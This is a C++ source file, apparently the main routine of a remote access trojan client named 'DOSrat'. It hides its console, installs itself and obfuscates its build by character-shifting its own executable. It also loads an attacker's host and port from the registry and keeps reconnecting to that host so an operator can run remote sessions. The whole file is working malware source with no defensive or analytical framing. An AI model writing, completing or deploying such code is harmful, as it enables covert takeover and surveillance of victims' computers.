#include <iostream>
#include <EssNet.h>
#include <Essentials.h>
#include <json.hpp>

using json = nlohmann::json;

string Version = "2.0.0-b.1";

#include "Classi.h"
#include "Funzioni.h"

using namespace std;

int main()
{
    TcpIP Client;
    SystemUtils su;
    DirUtils du;
    Encode en;
    ConsoleUtils cu;
    Settaggi sett;
    
    if (!du.CheckFile(du.GetModuleFilePath() + "DOSratDebug"))
        cu.HideConsole();

    if (du.CheckFile(du.GetModuleFilePath() + "SetBuild"))
    {
        en.CharShift(69, du.GetFullModuleFilePath(), du.GetModuleFilePath() + "ClientBuild.exe");
        return 0;
    }

    if (!du.CheckFile(du.GetModuleFilePath() + "LocTest"))
    {
        if (!IsInstalled())
        {
            InstallClient();
            return 0;
        }

        sett.GetSettingsFromReg();
    }
    else
    {
        sett.GetSettingsFromExe();
    }

    su.GetCPUload(); // Altrimenti con il GetInfo la prima volta da sempre il 6%

    Client.Host = sett.Host;
    Client.Port = sett.Porta;

    if (du.CheckDir("VXBkYXRl"))
        du.DelDir("VXBkYXRl");

    if (Client.StartClient() != 0)
    {
        Client.Stop();
        _getch();
        return 0;
    }

    for (bool i = true; i;)
    {
        while (!Client.Connect()) {}
        
        if (COMUNICAZIONI::Inizializzazione(Client.Sock))
        {
            switch (Sessione(Client))
            {
                case 0:
                    closesocket(Client.Sock);
                    break;

                case 1:
                    closesocket(Client.Sock);
                    Client.Stop();
                    return 0;
                    break;
            }
        }
        Client.Stop();
        Client.StartClient();
    }

    system("pause");

    return 0;
}